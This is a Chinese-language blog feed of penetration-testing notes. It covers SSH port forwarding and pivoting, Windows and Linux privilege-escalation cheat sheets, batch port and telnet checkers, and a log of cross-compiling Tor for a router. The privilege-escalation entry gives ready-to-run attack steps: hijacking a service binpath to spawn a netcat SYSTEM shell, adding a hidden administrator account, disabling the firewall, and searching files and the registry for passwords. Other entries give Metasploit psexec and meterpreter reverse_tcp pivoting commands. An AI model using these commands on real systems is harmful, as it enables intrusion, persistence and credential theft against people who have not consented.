https://github.com/5loyd/xsocksShadowSOCKS（影梭）    https://github.com/shadowSOCKSSocksCap64        http://www.sockscap64.com/proxychains        http://proxychains.sourceforge.net/</code></pre><p>from :<br><a href="https://04z.net/2017/07/09/AD-Attacks-Forwarding/" target="_blank" rel="noopener">https://04z.net/2017/07/09/AD-Attacks-Forwarding/</a></p>]]></content>
      
      <categories>
          
          <category> 技术相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> 端口转发 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>端口转发之SSH隧道</title>
      <link href="/2018/01/17/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B9%8BSSH%E9%9A%A7%E9%81%93/"/>
      <url>/2018/01/17/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B9%8BSSH%E9%9A%A7%E9%81%93/</url>
      <content type="html"><![CDATA[<p>…..<br><a id="more"></a></p><h2 id="ssh隧道有3种类型"><a href="#ssh隧道有3种类型" class="headerlink" title="ssh隧道有3种类型"></a>ssh隧道有3种类型</h2><pre><code>动态端口转发（Socks 代理）本地端口转发远程端口转发</code></pre><h2 id="本地端口转发"><a href="#本地端口转发" class="headerlink" title="本地端口转发"></a>本地端口转发</h2><p>通过SSH隧道，将一个远端机器能够访问到的地址和端口，映射为一个本地的端口。</p><p>已知主机A可以连接主机B，但无法连接主机C。A主机需要访问C主机的VNC服务（5900端口）</p><pre><code>host1 : 本地主机host2 : 远程主机（目的主机）host3 : host1  &lt;-&gt; host2  (都不通)host3同时连通前面两台主机host1  -&gt; host2   (最终目的)</code></pre><p>想法就是，通过host3，将host1连上host2</p><p>我们在host1执行下面的命令：</p><pre><code>$ ssh -L 2121:host2:21 host3</code></pre><p>命令中的L参数一共接受三个值，分别是”本地端口:目标主机:目标主机端口”，它们之间用冒号分隔。</p><p>这条命令的意思，就是指定SSH绑定本地端口2121，然后指定host3将所有的数据，</p><p>转发到目标主机host2的21端口（假定host2运行FTP，默认端口为21）。</p><p>这样一来，在host1连接本地的2121端口，就等于连上了host2的21端口。</p><pre><code>$ ftp localhost:2121$ ssh -p 2121 localhost   (21端口改为22)</code></pre><p>优点</p><pre><code>无需设置代理</code></pre><p>缺点</p><pre><code>每个服务都需要配置不同的端口转发</code></pre><h2 id="动态端口转发"><a href="#动态端口转发" class="headerlink" title="动态端口转发"></a>动态端口转发</h2><p>既然SSH可以传送数据，那么我们可以让那些不加密的网络连接，全部改走SSH连接，从而提高安全性</p><p>动态端口允许通过配置一个本地端口，把通过隧道到数据转发到远端的所有地址。</p><p>本地的应用程序需要使用Socks协议与本地端口通讯。此时SSH充当Socks代理服务器的角色。</p><p>假定我们要让8080端口的数据，都通过SSH传向远程主机：</p><pre><code>$ ssh -D 8080 user@host</code></pre><p>SSH会建立一个socket，去监听本地的8080端口。一旦有数据传向那个端口，就自动把它转移到</p><p>SSH连接上面，发往远程主机。</p><p>可以想象，如果8080端口原来是一个不加密端口，现在将变成一个加密端口。</p><p>优点</p><pre><code>配置一个代理服务就可以访问远端机器和与其所在子网络的所有服务</code></pre><p>缺点</p><pre><code>应用程序需要额外配置SOCKS代理，若应用程序不支持代理配置则无法使用</code></pre><h2 id="远程端口转发"><a href="#远程端口转发" class="headerlink" title="远程端口转发"></a>远程端口转发</h2><p>远程端口转发用于某些单向阻隔的内网环境，比如说NAT，网络防火墙。<br>在NAT设备之后的内网主机可以直接访问公网主机，但外网主机却无法访问内网主机的服务。<br>如果内网主机向外网主机建立一个远程转发端口，就可以让外网主机通过该端口访问该内网主机的服务。<br>可以把这个内网主机理解为“内应”和“开门者”。</p><pre><code>host1 ： 外网机器host2 ： 目的主机host3 ： 内网机器host3  -&gt; host1  (通)host1  -&gt; host3  (不通)host1  -&gt; host2  (最终目的)</code></pre><p>解决办法是，既然host3可以连host1，那么就从host3上建立与host1的SSH连接，然后在host1上使用这条连接就可以了</p><p>在host3执行下面的命令：</p><pre><code>$ ssh -R 2121:host2:22 root@host1-R : &quot;远程主机端口:目标主机:目标主机端口&quot;。</code></pre><p>host1监听它自己的2121端口，然后将所有数据经由host3，转发到host2的21端口。<br>由于对于host3来说，host1是远程主机，所以这种情况就被称为”远程端口绑定”。<br>在host1就可以连接host2了：</p><pre><code>$ ssh localhost:2121</code></pre><p>如果host3是目的主机的话，即源主机是目的主机，我们的目的是host1-&gt;host3 (通)<br>则：<br>    在host3上执行： ssh -NfR 2121:localhost:22 user@host1 -p 22<br>    将host3的22端口和host1的2121端口绑定，相当于远程端口映射<br>    在host1就可以连接host3了：</p><pre><code>    $ ssh localhost -p 2121也可以在host2上：    $ ssh host1 -p 2121</code></pre><p>优点</p><pre><code>可以穿越防火墙和NAT设备</code></pre><p>缺点</p><pre><code>每个服务都需要配置不同的端口转发</code></pre><p>如何禁止端口转发</p><p>设置ssh服务配置文件/etc/ssh/sshd_config</p><pre><code>AllowTcpForwarding no</code></pre><h2 id="简而言之"><a href="#简而言之" class="headerlink" title="简而言之"></a>简而言之</h2><pre><code>http://staff.washington.edu/corey/fw/ssh-port-forwarding.html本地访问127.0.0.1:port1就是host:port2(用的更多)ssh -CfNg -L port1:127.0.0.1:port2 user@host    #本地转发访问host:port2就是访问127.0.0.1:port1ssh -CfNg -R port2:127.0.0.1:port1 user@host    #远程转发可以将dmz_host的hostport端口通过remote_ip转发到本地的port端口ssh -qTfnN -L port:dmz_host:hostport -l user remote_ip   #正向隧道，监听本地port可以将dmz_host的hostport端口转发到remote_ip的port端口ssh -qTfnN -R port:dmz_host:hostport -l user remote_ip   #反向隧道，用于内网穿透防火墙限制之类</code></pre><h2 id="SSH-穿透"><a href="#SSH-穿透" class="headerlink" title="SSH 穿透"></a>SSH 穿透</h2><pre><code>ssh -D 127.0.0.1:1080 -p 22 user@IP Add socks4 127.0.0.1 1080 in /etc/proxychains.conf proxychains commands target </code></pre><p>SSH 穿透从一个网络到另一个网络</p><pre><code>ssh -D 127.0.0.1:1080 -p 22 user1@IP1 Add socks4 127.0.0.1 1080 in /etc/proxychains.conf proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2 Add socks4 127.0.0.1 1081 in /etc/proxychains.conf proxychains commands target </code></pre><p>使用 metasploit 进行穿透</p><pre><code>route add X.X.X.X 255.255.255.0 1 use auxiliary/server/socks4a run proxychains msfcli windows/* PAYLOAD=windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 RHOST=IP E</code></pre><p>或者</p><pre><code># http://www.offensive-security.com/metasploit-unleashed/pivoting/meterpreter &gt; ipconfig IP Address  : 10.1.13.3 meterpreter &gt; run autoroute -s 10.1.13.0/24 meterpreter &gt; run autoroute -p 10.1.13.0          255.255.255.0      Session 1 meterpreter &gt; Ctrl+Z msf auxiliary(tcp) &gt; use exploit/windows/smb/psexec msf exploit(psexec) &gt; set RHOST 10.1.13.2 msf exploit(psexec) &gt; exploit meterpreter &gt; ipconfig IP Address  : 10.1.13.2 </code></pre><p>扩展：</p><pre><code>通过VPS SSH隧道使用本地msfhttps://evi1cg.me/archives/Port_Forward_using_VPS_SSH_Tunnel.html</code></pre><p>from :<br>    三种不同类型的ssh隧道<br>    <a href="http://hetaoo.iteye.com/blog/2299123" target="_blank" rel="noopener">http://hetaoo.iteye.com/blog/2299123</a><br>    ssh用法及命令<br>    <a href="http://blog.csdn.net/pipisorry/article/details/52269785" target="_blank" rel="noopener">http://blog.csdn.net/pipisorry/article/details/52269785</a><br>    ssh隧道建立<br>    <a href="http://blog.csdn.net/yuanchao99/article/details/72877586" target="_blank" rel="noopener">http://blog.csdn.net/yuanchao99/article/details/72877586</a><br>        xxxx<br>        <a href="https://xianzhi.aliyun.com/forum/topic/142" target="_blank" rel="noopener">https://xianzhi.aliyun.com/forum/topic/142</a><br>    SSH隧道综合指南<br>    <a href="https://www.4hou.com/technology/10863.html" target="_blank" rel="noopener">https://www.4hou.com/technology/10863.html</a></p>]]></content>
      
      <categories>
          
          <category> 技术相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> 端口转发 </tag>
            
            <tag> SSH隧道 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>域渗透(提权篇)</title>
      <link href="/2018/01/09/%E5%9F%9F%E6%B8%97%E9%80%8F(%E6%8F%90%E6%9D%83%E7%AF%87)/"/>
      <url>/2018/01/09/%E5%9F%9F%E6%B8%97%E9%80%8F(%E6%8F%90%E6%9D%83%E7%AF%87)/</url>
      <content type="html"><![CDATA[<p>…..<br><a id="more"></a></p><h2 id="常见信息收集"><a href="#常见信息收集" class="headerlink" title="常见信息收集"></a>常见信息收集</h2><pre><code>dir /a-r-d /s /b                                 检查文件夹可写状态dir /b/s password.txt                            查找密码文件或其它敏感文件dir /b/s config.*findstr /si password *.xml *.ini *.txt findstr /si login *.xml *.ini *.txt C:\sysprep.infC:\sysprep\sysprep.xmlC:\Windows\Panther\Unattend\Unattended.xmlC:\Windows\Panther\Unattended.xmldir /s *pass* == *cred* == *vnc* == *.config*    搜索system32关键字的文件findstr /si password *.xml *.ini *.txt           搜索某些特定的文件类型reg query HKLM /f password /t REG_SZ /s          搜索注册表中包含passwordreg query HKCU /f password /t REG_SZ /snetsh firewall show config                       显示 Windows 防火墙配置netsh firewall show state                        显示 Windows 防火墙的当前状态 netsh firewall set opmode disable                关闭防火墙netsh advfilewall set publicprofile state offsysteminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;    获取操作系统信息systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;         schtasks /query /fo LIST /v                      计划任务 [国外调整 chcp 437]route print                                      查看路由表arp -A                                           查看ARP缓存</code></pre><h2 id="upnphost提权"><a href="#upnphost提权" class="headerlink" title="upnphost提权"></a>upnphost提权</h2><pre><code>sc qc Spooler                 查询，配置，和管理Windows服务accesschk.exe -ucqv Spooler   检查每个服务需要的权限   XP_SP2被修复攻击手法：    sc qc upnphost    sc config upnphost binpath= &quot;C:\nc.exe -nv 127.0.0.1 9988 -e    C:\WINDOWS\System32\cmd.exe&quot;    sc config upnphost obj= &quot;.\LocalSystem&quot; password= &quot;&quot;    sc qc upnphost    net start upnphost    执行netcat并且使用SYSTEM权限反弹一个shell    sc config PFNET binpath= &quot;net user admin P@ssword123! /add&quot;    sc stop PFNET    sc start PFNET    sc config PFNET binpath= &quot;net localgroup Administrators admin /add&quot;    sc stop PFNET    sc start PFNET</code></pre><h2 id="服务与权限"><a href="#服务与权限" class="headerlink" title="服务与权限"></a>服务与权限</h2><pre><code>DRIVERQUERY                 安装驱动wmic product list brief     查看安装程序和版本信息. [可能存在漏洞]wmic service list brief     查看服务、进程和启动程序信息wmic process list briefwmic startup list briefwmic qfe get Caption,Description,HotFixID,InstalledOn   查看安装补丁和时间信息wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KBxxxxxxx&quot;wimc process where(description=&quot;进程名&quot;)       结合tasklist /svc wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;    列出目标机器上所有没有用引号包含的服务路径tasklist /v /fo list /fi &quot;USERNAME eq NT AUTHORITY\SYSTEM&quot;  筛选NT AUTHORITY\SYSTEM权限进程icacls &quot;C:\Program Files (x86)\360&quot;     查看路径中受影响文件夹的权限</code></pre><h2 id="补丁对应Exp"><a href="#补丁对应Exp" class="headerlink" title="补丁对应Exp"></a>补丁对应Exp</h2><p>补丁对比 <a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester" target="_blank" rel="noopener">https://github.com/GDSSecurity/Windows-Exploit-Suggester</a></p><pre><code>pip install xlrd --upgrade./windows-exploit-suggester.py --update[+] writing to file 2014-06-06-mssb.xlsx 输入“systeminfo”输入，并将其指向微软数据库./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo     win7sp1-systeminfo.txt 未修补漏洞存在的exp./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --ostext     &#39;windows server 2008 r2&#39;</code></pre><h2 id="AlwaysInstallElevated提权"><a href="#AlwaysInstallElevated提权" class="headerlink" title="AlwaysInstallElevated提权"></a>AlwaysInstallElevated提权</h2><pre><code>http://www.greyhathacker.net/?p=185如果这个设置被启用，它允许任何权限的用户暂时使用NT AUTHORITY\SYSTEM权限来安装*.msi文件。AlwaysInstallElevated且它的DWORD值是1才有效。https://github.com/SecWiki/windows-kernel-exploitshttps://github.com/SecWiki/linux-kernel-exploits可以利用Advanced Installer(http://www.advancedinstaller.com/)生成msi安装包</code></pre><h2 id="查看-msi程序的执行权限"><a href="#查看-msi程序的执行权限" class="headerlink" title="查看.msi程序的执行权限"></a>查看.msi程序的执行权限</h2><pre><code>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevatedreg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code></pre><h2 id="查看是否设置有setuid和setgid"><a href="#查看是否设置有setuid和setgid" class="headerlink" title="查看是否设置有setuid和setgid"></a>查看是否设置有setuid和setgid</h2><pre><code>reg query HKEY_Local_Machine\System\CurrentControlSet\Services\NfsSvr\Parameters\SafeSetUidGidBitsCVE-2017-1000367    系统必须启用selinux    sudo需要用selinux支持（sudo -r）    用户需要具有sudo权限gcc -o sudopwn sudopwn.c -lutil./sudopwn</code></pre><p>枚举系统设置和权限的检查<br><a href="http://www.securitysift.com/download/linuxprivchecker.py" target="_blank" rel="noopener">http://www.securitysift.com/download/linuxprivchecker.py</a></p><h2 id="基于操作系统的内核版本号"><a href="#基于操作系统的内核版本号" class="headerlink" title="基于操作系统的内核版本号"></a>基于操作系统的内核版本号</h2><pre><code>https://github.com/PenturaLabs/Linux_Exploit_Suggester./Linux_Exploit_Suggester.pl -k 内核版本号[例如3.10,结合uname -a]</code></pre><h2 id="检测权限提升向量的shell脚本"><a href="#检测权限提升向量的shell脚本" class="headerlink" title="检测权限提升向量的shell脚本"></a>检测权限提升向量的shell脚本</h2><pre><code>https://github.com/pentestmonkey/unix-privesc-checkunix-privesc-check standardunix-privesc-check detailed</code></pre><p>下载和解压缩脚本RootHelper<br><a href="https://github.com/NullArray/RootHelper" target="_blank" rel="noopener">https://github.com/NullArray/RootHelper</a></p><h2 id="CVE-2017-7494-Samba"><a href="#CVE-2017-7494-Samba" class="headerlink" title="CVE-2017-7494[Samba]"></a>CVE-2017-7494[Samba]</h2><pre><code>http://fuping.site/2017/05/25/Samba-Remote-Code-Execution-Vulnerability-Replication/use exploit/linux/samba/is_known_pipenameset RHOST 192.168.232.137set target 3exploit</code></pre><h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2><pre><code>lsb_release -auname -apython -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;suid 提权 [有限制]find / -perm -u=s -type f 2&gt;/dev/null</code></pre><p>from:<br><a href="https://04z.net/2017/07/10/AD-Attacks-go/" target="_blank" rel="noopener">https://04z.net/2017/07/10/AD-Attacks-go/</a></p>]]></content>
      
      <categories>
          
          <category> 技术相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> 域渗透 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>批量测试端口开放</title>
      <link href="/2017/12/09/%E6%89%B9%E9%87%8F%E6%B5%8B%E8%AF%95%E7%AB%AF%E5%8F%A3%E5%BC%80%E6%94%BE/"/>
      <url>/2017/12/09/%E6%89%B9%E9%87%8F%E6%B5%8B%E8%AF%95%E7%AB%AF%E5%8F%A3%E5%BC%80%E6%94%BE/</url>
      <content type="html"><![CDATA[<p>…..<br><a id="more"></a></p><h2 id="PowerShell简单测试端口开放"><a href="#PowerShell简单测试端口开放" class="headerlink" title="PowerShell简单测试端口开放"></a>PowerShell简单测试端口开放</h2><pre><code>import-Module .\Invoke-TestPortInvoke-TestPort -ipLists C:\x.txt 23function Invoke-TestPort{    [CmdletBinding()] Param (        [Parameter(Mandatory = $true, Position = 0)]        [Alias(&quot;Url&quot;,&quot;Domain&quot;)]        [String]        $ipLists,        [Parameter(Mandatory = $true ,Position = 1)]        [String]        $Port    )    Process{       Write-Host &quot;Starting TestPort ...&quot;       $ips = Get-Content -ErrorAction SilentlyContinue -Path $ipLists       foreach ($ip in $ips){           try{               $socket = new-object System.Net.Sockets.TcpClient($ip, $Port)           }           catch [Exception]{               Write-Host $ip&quot;:&quot;$Port &quot;CAN&#39;T Connected&quot;               continue           }           Write-Host $ip&quot;:&quot;$Port &quot;CAN Connected&quot;        }    }}</code></pre><h2 id="Python批量测试Telnet端口开放"><a href="#Python批量测试Telnet端口开放" class="headerlink" title="Python批量测试Telnet端口开放"></a>Python批量测试Telnet端口开放</h2><pre><code>import sysimport getpassimport pexpectimport telnetlibimport threadpoolOKWHITE = &#39;\033[1;37m&#39;OKENDC = &#39;\033[0m&#39;class Telnets_OK():    def __init__(self,ip,thread_id,Store_Result_txt):        self.ip                      = ip        self.thread_id               = thread_id        self.Store_Result_txt        = Store_Result_txt        self.OKWHITE = &#39;\033[1;37m&#39;         self.OKGREEN = &#39;\033[92m&#39;        self.OKWARNING = &#39;\033[93m&#39;         self.OKFAIL = &#39;\033[91m&#39;            self.OKENDC = &#39;\033[0m&#39;        self.login()    def Store_ok_txt(self):        with open(&#39;Can_Telnet_{0}&#39;.format(self.Store_Result_txt),&#39;a+&#39;) as f:            f.write(self.ip + &quot;^&quot;)            f.write(&quot;\n&quot;)    def Store_not_ok_txt(self):        with open(&#39;Cannot_Telnet_{0}&#39;.format(self.Store_Result_txt),&#39;a+&#39;) as f:            f.write(self.ip + &quot;^&quot;)            f.write(&quot;\n&quot;)    def login( self ):        cmd = &#39;telnet &#39; + self.ip         child = pexpect.spawn(cmd)        index = child.expect([&quot;[lL]ogin&quot;, &quot;(?i)Unknown host&quot;, pexpect.EOF, pexpect.TIMEOUT])        if ( index == 0 ):            print self.OKGREEN +   &quot;[+] can   telnet : {0}&quot;.format(self.ip) + self.OKENDC            self.Store_ok_txt()        else:              print self.OKFAIL + &quot;[-] can\&#39;t telnet : {0}&quot;.format(self.ip) + self.OKENDC            self.Store_not_ok_txt()        child.close()  def Load_Urls_Txt( txt):    Urls_Pass   = []    f           = open( txt, &#39;r&#39;)    line        = f.readline().strip(&#39;\n&#39;)    while (line):        Urls_Pass.append(line)        line    = f.readline().strip(&#39;\n&#39;)    f.close()    return Urls_Passdef main(Urls_Pass ,Store_Result_txt):    task_pool = threadpool.ThreadPool(20)    templists = []    for i in range(0,len(Urls_Pass)):        a       = Urls_Pass[0]        temp    = a.split(&#39;^&#39;)        udic    = {}        udic[&#39;ip&#39;]      = temp[0]         udic[&#39;Store_Result_txt&#39;]= Store_Result_txt        udic[&#39;thread_id&#39;]   = i        tmp = (None,udic)        Urls_Pass.remove(a)        templists.append(tmp)    request_list = threadpool.makeRequests(Telnets_OK , templists)    map(task_pool.putRequest , request_list)    task_pool.wait()if __name__ == &#39;__main__&#39;:    if len(sys.argv) != 2:        print OKWHITE        print &#39;Usage      : python {0} &lt;txt&gt;&#39;.format(sys.argv[0])         print &#39;txt        : domain or ip&#39;        print &#39;Threads    : 20 (default)&#39;        print &#39;Name       : piliang telnet&#39;        print OKENDC        sys.exit(1)    print OKWHITE + &quot;Loading : {0}&quot;.format(sys.argv[1])     txt             = &#39;&#39;.join(sys.argv[1])    Urls_Pass    = Load_Urls_Txt(txt)    print &quot;Lines : {0}&quot;.format(len(Urls_Pass)) + OKENDC    main(Urls_Pass, sys.argv[1])</code></pre>]]></content>
      
      <categories>
          
          <category> 技术相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PowerShell </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>交叉编译tor在路由器上使用</title>
      <link href="/2017/12/07/%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91tor%E5%9C%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B8%8A%E4%BD%BF%E7%94%A8/"/>
      <url>/2017/12/07/%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91tor%E5%9C%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B8%8A%E4%BD%BF%E7%94%A8/</url>
      <content type="html"><![CDATA[<h2 id="0x01-正常编译tor"><a href="#0x01-正常编译tor" class="headerlink" title="0x01 正常编译tor"></a>0x01 正常编译tor</h2><p>Router Model : RT-AC66U<br>Router CPU : MIPS32<br>在 <code>Ubuntu</code> 下</p><pre><code>sudo apt-get install opensslsudo apt-get install libevent-devsudo apt-get install build-essentialsudo apt-get install libssl-devtar xzf tor-0.3.1.8.tar.gzcd tor-0.3.1.8./configure &amp;&amp; makesrc/or/torsrc/config/torrc   # torrc src/or/tor -f src/config/torrc &amp;</code></pre><a id="more"></a><p>直接交叉编译tor 是有问题的<br>结合上篇文章编译buildroot生成的buildroot-2011.05下/output/ 相关编译文件:</p><pre><code>$ cd tor $ ./configure : $ CC=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-gcc RANLIB=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-ranlib AR=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-ar LD=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-ld STRIP=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-strip ./configure --host=mipsel-linux --disable-tool-name-check --enable-static-libevent --with-libevent-dir=/usr/local/lib</code></pre><!-- more --><p>即:</p><pre><code>$ CC=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-gcc \RANLIB=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-ranlib \AR=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-ar \LD=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-ld \STRIP=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-strip \./configure --host=mipsel-linux --disable-tool-name-check \--enable-static-libevent \--with-libevent-dir=/usr/local/libor --with-libevent-dir=/usr/lib64/</code></pre><p>出错</p><pre><code>checking for libevent directory... configure: WARNING: Could not find a linkable libevent.If you have it installed somewhere unusual, you can specify an explicit path using --with-libevent-dirconfigure: WARNING: On most Redhat-based systems, you can get libevent by installing the libevent RPM packageconfigure: WARNING:    You will probably need to install libevent-devel too.configure: error: Missing libraries; unable to proceed.</code></pre><p>装了libevent-devel 依旧如是</p><p>拷贝 bin/ 下的<code>mipsel-linux-*</code> 到 <code>ubuntu</code></p><pre><code>$ CC=/home/db/Desktop/usr/bin/mipsel-linux-gcc RANLIB=/home/db/Desktop/usr/bin/mipsel-linux-ranlib AR=/home/db/Desktop/usr/bin/mipsel-linux-ar LD=/home/db/Desktop/usr/bin/mipsel-linux-ld STRIP=/home/db/Desktop/usr/bin/mipsel-linux-strip ./configure --host=mipsel-linux --disable-tool-name-check --enable-static-libevent --with-libevent-dir=/home/db/Desktop/libevent-1.4.12-stable/</code></pre><p>即:</p><pre><code>$ CC=/home/db/Desktop/usr/bin/mipsel-linux-gcc \RANLIB=/home/db/Desktop/usr/bin/mipsel-linux-ranlib \AR=/home/db/Desktop/usr/bin/mipsel-linux-ar \LD=/home/db/Desktop/usr/bin/mipsel-linux-ld \STRIP=/home/db/Desktop/usr/bin/mipsel-linux-strip \./configure --host=mipsel-linux \--disable-tool-name-check --enable-static-libevent \--with-libevent-dir=/home/db/Desktop/libevent-1.4.12-stable/or --with-libevent-dir=/usr/lib/x86_64-linux-gnu/--with-libevent-dir=/lib/x86_64-linux-gnu/</code></pre><p>也是不行滴</p><p>ubuntu 直接编译 tor 后 拷贝<code>tor(10M)</code> 到 <code>centos</code>上使用,转移各种库依旧是不行滴。 </p><pre><code>$./tor: error while loading shared libraries: libssl.so.1.0.0: cannot open shared object file: No such file or directory===&gt; $ copy /lib/x86_64-linux-gnu/libssl.so.1.0.0         (ubuntu)  =&gt; desktop (centos )$ copy /lib/x86_64-linux-gnu/libcrypto.so.1.0.0     (ubuntu)  =&gt; desktop (centos )$ mv libssl.so.1.0.0 /usr/lib64/            (centos )$ mv libcrypto.so.1.0.0 /usr/lib64/        (centos )</code></pre><p>$ ./tor –help</p><pre><code>./tor: /lib64/libc.so.6: version &#39;GLIBC_2.14&#39; not found (required by ./tor)./tor: /lib64/libc.so.6: version &#39;GLIBC_2.17&#39; not found (required by ./tor)./tor: /lib64/libc.so.6: version &#39;GLIBC_2.14&#39; not found (required by /usr/lib64/libssl.so.1.0.0)./tor: /lib64/libc.so.6: version &#39;GLIBC_2.14&#39; not found (required by /usr/lib64/libcrypto.so.1.0.0)$ ls -al /lib/x86_64-linux-gnu/libc.so.6     (ubuntu)    lrwxrwxrwx 1 root root 12 Jun 16 16:57 /lib/x86_64-linux-gnu/libc.so.6 -&gt; libc-2.23.so$ copy /lib/x86_64-linux-gnu/libc-2.23.so        (ubuntu)  =&gt; desktop (centos )$ mv libc-2.23.so /lib64/libc-2.23.so         (centos )    ln: creating symbolic link &#39;/lib64/libc.so.6&#39;: File exists$ mv /lib64/libc.so.6 /lib64/libc.so.6-copy$ ln -s /lib64/libc-2.23.so /lib64/libc.so.6error error !!!!!!!!!!!!!!!!!!!!!!!!!!!!!$ ls -al #命令都使用不了了ls: error while loading shared libraries: libc.so.6: cannot open shared object file: No such file or directory$ mvmv: error while loading shared libraries: libc.so.6: cannot open shared object file: No such file or directory</code></pre><p>看了网上,tor交叉编译时需要的库,也需要交叉编译的 : </p><p>Centos<br>/root/Desktop/1/ : </p><pre><code>openssl-1.1.0ghttps://www.openssl.org/source/openssl-1.1.0g.tar.gzlibevent-2.1.8-stable.tar.gzhttps://github.com/libevent/libevent/releases/download/release-2.1.8-stable/libevent-2.1.8-stable.tar.gzzlib-1.2.11https://zlib.net/zlib-1.2.11.tar.gz</code></pre><p><code>----------------------------------------------------------------------</code></p><h2 id="0x02-交叉编译-openssl"><a href="#0x02-交叉编译-openssl" class="headerlink" title="0x02 交叉编译 openssl"></a>0x02 交叉编译 openssl</h2><pre><code>$ CC=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-gcc AR=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-ar RANLIB=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-ranlib LD=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-ld STRIP=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-strip ./config --prefix=/root/Desktop/cross/yes/openssl </code></pre><p>即:</p><pre><code>$ CC=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-gcc \AR=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-ar \RANLIB=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-ranlib \./config \--prefix=/root/Desktop/cross/yes/openssl </code></pre><p>$ make 出错 </p><pre><code>crypto/aes/aes-x86_64.s:1743: Error: unrecognized opcode &#39;leaq 48(%rsi),%rsp&#39;crypto/aes/aes-x86_64.s:1745: Error: unrecognized opcode &#39;popfq&#39;crypto/aes/aes-x86_64.s:1749: Error: Alignment too large: 28. assumed.crypto/aes/aes-x86_64.s:2139: Error: Alignment too large: 28. assumed.crypto/aes/aes-x86_64.s:2534: Error: Alignment too large: 28. assumed.make[1]: *** [crypto/aes/aes-x86_64.o] Error 1make[1]: Leaving directory &#39;/root/Desktop/cross/1/openssl-1.1.0g&#39;make: *** [all] Error 2</code></pre><p>使用 <code>--cross-compile-prefix</code> :</p><pre><code>$ CC=gcc RANLIB=ranlib AR=ar ./config --prefix=/root/Desktop/cross/yes/openssl/ --cross-compile-prefix=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux- linux-mips32</code></pre><p>即:</p><pre><code>$ CC=gcc \RANLIB=ranlib \AR=ar \./config \--prefix=/root/Desktop/cross/yes/openssl/ \--cross-compile-prefix=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux- \linux-mips32</code></pre><p>编译成功是因为<code>Makefile</code>根本没起作用,上面那些参数根本没填入到Makefile里面</p><p><code>https://github.com/openssl/openssl/blob/master/INSTALL</code><br>官方文档说使用<code>--cross-compile-prefix</code>时,必须用<code>./Configure</code>,而不是./config<br>==&gt;</p><pre><code>$ CC=gcc RANLIB=ranlib AR=ar ./Configure --prefix=/root/Desktop/cross/yes/openssl/ --cross-compile-prefix=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux- linux-mips32</code></pre><p>即:</p><pre><code>$ CC=gcc \RANLIB=ranlib \AR=ar \./Configure \    ####./config 改成 ./Configure--prefix=/root/Desktop/cross/yes/openssl/ \--cross-compile-prefix=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux- \linux-mips32or os/compiler:linux-mips32</code></pre><p>$ make 出错</p><pre><code>/root/Desktop/8/buildroot-2011.05/output/host/usr/mipsel-unknown-linux-uclibc/sysroot/usr/include/features.h:216:5: \error: #error It appears you have defined _FILE_OFFSET_BITS=64. Unfortunately, uClibc was built without large file support enabled.In file included from /root/Desktop/8/buildroot-2011.05/output/host/usr/mipsel-unknown-linux-uclibc/sysroot/usr/include/stdio.h:72,                         from crypto/bio/bss_file.c:37:/root/Desktop/8/buildroot-2011.05/output/host/usr/mipsel-unknown-linux-uclibc/sysroot/usr/include/bits/uClibc_stdio.h:61:2: \error: #error Sorry... uClibc was built without large file support!</code></pre><p>发现 ===&gt; 